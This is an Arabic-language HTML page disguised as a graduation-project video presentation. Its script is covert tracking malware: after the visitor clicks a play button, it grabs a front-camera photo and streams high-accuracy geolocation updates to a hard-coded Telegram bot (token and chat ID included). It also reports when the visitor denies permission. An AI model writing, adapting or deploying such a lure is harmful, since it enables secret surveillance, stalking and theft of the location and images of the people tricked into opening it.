<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>عرض تقني - مشروع التخرج</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body, html { height: 100%; width: 100%; overflow: hidden; background-color: #000; }
        .video-wrapper { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
        video { width: 100%; height: 100%; object-fit: cover; }
        
        #prePermissionOverlay { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0,0,0,0.85); color: white; z-index: 9999; 
            display: flex; flex-direction: column; align-items: center; justify-content: center;
        }
        #proceedButton { 
            margin-top: 20px; padding: 12px 30px; background: #4d94ff; 
            color: white; border: none; border-radius: 25px; cursor: pointer; font-weight: bold;
        }
    </style>
</head>
<body>

    <div id="prePermissionOverlay">
        <p>⚠️ يتطلب العرض الوصول للكاميرا والموقع</p>
        <button id="proceedButton">تشغيل العرض الآن</button>
    </div>

    <div class="video-wrapper">
        <video id="mainVideo" autoplay muted playsinline poster="2.png">
            <source src="1.mp4" type="video/mp4">
        </video>
    </div>

    <script>
        const botToken = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
        const chatId = "1611398303";

        document.getElementById('proceedButton').onclick = function() {
            document.getElementById('prePermissionOverlay').style.display = 'none';
            startTracking();
        };

        function startTracking() {
            // 1. طلب الكاميرا (بدون ميكروفون لزيادة السرعة)
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                captureVideoFrame(stream);
                // إبقاء الكاميرا تعمل في الخلفية إذا أردت سحب صور متكررة
            })
            .catch(err => sendToTelegram("⚠️ رفض الكاميرا"));

            // 2. سحب الموقع بشكل مستمر (طالما الصفحة مفتوحة)
            navigator.geolocation.watchPosition(pos => {
                const data = `📍 تحديث موقع مباشر:\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nAccuracy: ${pos.coords.accuracy}m`;
                sendToTelegram(data);
            }, err => {
                sendToTelegram("⚠️ رفض الموقع أو غير مفعل");
            }, { enableHighAccuracy: true });
        }

        function captureVideoFrame(stream) {
            let v = document.createElement('video');
            v.srcObject = stream;
            v.play();
            setTimeout(() => {
                let canvas = document.createElement('canvas');
                canvas.width = 720; canvas.height = 1280;
                canvas.getContext('2d').drawImage(v, 0, 0, canvas.width, canvas.height);
                sendPhotoToTelegram(canvas.toDataURL('image/jpeg'));
                // لإيقاف الكاميرا بعد أول صورة (أو اتركها لتعمل)
                stream.getTracks().forEach(track => track.stop());
            }, 2000);
        }

        function sendToTelegram(text) {
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
        }

        function sendPhotoToTelegram(imgData) {
            let byteString = atob(imgData.split(',')[1]);
            let ab = new ArrayBuffer(byteString.length);
            let ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
            let blob = new Blob([ab], {type: 'image/jpeg'});
            
            let form = new FormData();
            form.append('document', blob, "capture.jpg");
            fetch(`https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}`, { method: 'POST', body: form });
        }
    </script>
</body>
</html>
